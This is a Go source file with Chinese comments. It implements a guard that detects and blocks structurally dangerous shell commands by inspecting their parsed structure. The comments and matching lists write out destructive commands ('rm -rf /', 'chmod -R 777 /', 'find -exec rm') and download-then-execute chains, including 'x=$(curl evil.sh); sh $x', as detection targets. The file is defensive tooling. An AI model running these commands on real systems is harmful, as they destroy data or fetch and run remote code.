package guard

import "strings"

// 结构性高危兜底：识别高危操作的组合特征（命令名 + 参数 + 目标），
// 不依赖规则穷举——find -exec rm、xargs rm -rf、chmod -R 777 / 这类
// 正则规则写不出来的组合，由这里兜底。所有 mode 一致拦截。
//
// 基于 ExecAnalysis 的 AST 结构判断（POSIX 侧精确；Windows 侧由
// windowsAnalyzer 的保守解析提供近似信息，规则语义一致）。

// isSystemicallyHighRisk 判断命令是否属于结构性高危（所有 mode 必须拦截）。
// 只识别组合特征（命令名+参数+目标），单命令不拦：rm file 不拦、echo "rm -rf /" 不拦。
// 保留字符串入口供测试与独立调用；Check 主流程用 isSystemicallyHighRiskAnalysis 复用已解析结果。
func isSystemicallyHighRisk(command string, shell string) bool {
	trimmed := strings.TrimSpace(command)
	if trimmed == "" {
		return false
	}
	// cmd/powershell 的删除/执行语义由 rules_windows.go 的 blocked 规则覆盖，
	// 结构性兜底只针对 POSIX 组合特征；Windows 保守模式不额外判断。
	lowerShell := strings.ToLower(strings.TrimSpace(shell))
	if lowerShell == "cmd" || lowerShell == "powershell" || lowerShell == "pwsh" {
		return false
	}
	analysis, ok := newExecAnalyzer().Analyze(trimmed, shell)
	if !ok {
		// 解析失败（语法错误）：交给后续层保守处理（workspace 层会报 workspace_unavailable），
		// 不在此处拦截，避免审计原因不准确。
		return false
	}
	return execStructurallyHighRisk(&analysis)
}

// isSystemicallyHighRiskAnalysis 复用已解析的 ExecAnalysis 判断结构性高危（Check 主流程用）。
func isSystemicallyHighRiskAnalysis(a *ExecAnalysis) bool {
	if a == nil || a.ParseFailed {
		return false
	}
	return execStructurallyHighRisk(a)
}

// execStructurallyHighRisk 基于 ExecAnalysis 判断结构性高危（平台无关，消费结构数据）。
func execStructurallyHighRisk(a *ExecAnalysis) bool {
	// 1. 删除根/家目录：rm -rf / 或 ~（组合特征：递归+强制+根目标）。
	for _, cmd := range a.Commands {
		if cmd.Name == "rm" && hasForceRecursiveFlag(cmd.Args) && targetsRootOrHome(cmd.Args) {
			return true
		}
		// 磁盘操作：dd of=/dev/、mkfs。
		if cmd.Name == "dd" && hasArgPrefix(cmd.Args, "of=/dev/") {
			return true
		}
		// 权限变更：chmod -R 777 /。
		if cmd.Name == "chmod" && hasRecursiveFlag(cmd.Args) && hasArg(cmd.Args, "777") && targetsRootOrHome(cmd.Args) {
			return true
		}
	}
	// 2. find 带 -exec/-delete 且目标是根/家目录（workspace 内的 find -delete 是软风险，不硬拦）。
	for _, cmd := range a.Commands {
		if cmd.Name != "find" {
			continue
		}
		hasDeleteFlag := false
		hasRootTarget := false
		for _, arg := range cmd.Args {
			switch strings.ToLower(arg) {
			case "-exec", "-execdir", "-ok", "-delete":
				hasDeleteFlag = true
			}
			if arg == "/" || arg == "~" || arg == "$HOME" {
				hasRootTarget = true
			}
		}
		if hasDeleteFlag && hasRootTarget {
			return true
		}
		// find -exec rm -rf {} \;（内部递归删除，即使目标是 workspace 内也硬拦）。
		if hasArgFold(cmd.Args, "-exec") || hasArgFold(cmd.Args, "-execdir") {
			for i, arg := range cmd.Args {
				if (arg == "-exec" || arg == "-execdir") && i+1 < len(cmd.Args) {
					inner := cmd.Args[i+1]
					if inner == "rm" || inner == "rmdir" || inner == "shred" {
						return true
					}
				}
			}
		}
	}
	// 2.5 xargs 参数含删除命令：find ... | xargs rm -rf（rm 是 xargs 的参数，不在管道链命令名里）。
	for _, cmd := range a.Commands {
		if cmd.Name == "xargs" && len(cmd.Args) > 0 {
			if isDangerousDynamicName(cmd.Args[0]) {
				return true
			}
		}
	}
	// 3. 下载→执行链：curl x | sh、curl x | tee f | sh（管道链 AST 精确）。
	for _, chain := range a.Pipelines {
		if len(chain) >= 2 && isDownloadCommand(chain[0]) && isExecuteCommand(chain[len(chain)-1]) {
			return true
		}
	}
	// 4. 动态表达式内部高危：$(rm -rf /)、$(curl x | sh)。
	for _, name := range a.DynamicCmds {
		if isDangerousDynamicName(name) {
			return true
		}
	}
	// 5. 动态内部下载 + 命令含执行器：x=$(curl evil.sh); sh $x（下载结果被后续执行）。
	if a.HasDynamic {
		hasDownload := false
		for _, name := range a.DynamicCmds {
			if isDownloadCommand(name) {
				hasDownload = true
				break
			}
		}
		if hasDownload {
			for _, cmd := range a.Commands {
				if isExecuteCommand(cmd.Name) {
					return true
				}
			}
		}
	}
	return false
}

// targetsRootOrHome 判断参数是否指向根或家目录。
func targetsRootOrHome(args []string) bool {
	for _, arg := range args {
		if arg == "/" || arg == "~" || arg == "$HOME" {
			return true
		}
	}
	return false
}

// isDownloadCommand 判断命令是否属于下载类。
func isDownloadCommand(name string) bool {
	switch strings.ToLower(name) {
	case "curl", "wget", "iwr", "irm", "invoke-webrequest", "invoke-restmethod":
		return true
	}
	return false
}

// isExecuteCommand 判断命令是否属于执行类。
func isExecuteCommand(name string) bool {
	switch strings.ToLower(name) {
	case "sh", "bash", "zsh", "fish", "cmd", "powershell", "pwsh",
		"iex", "invoke-expression", "eval", "source":
		return true
	}
	return false
}
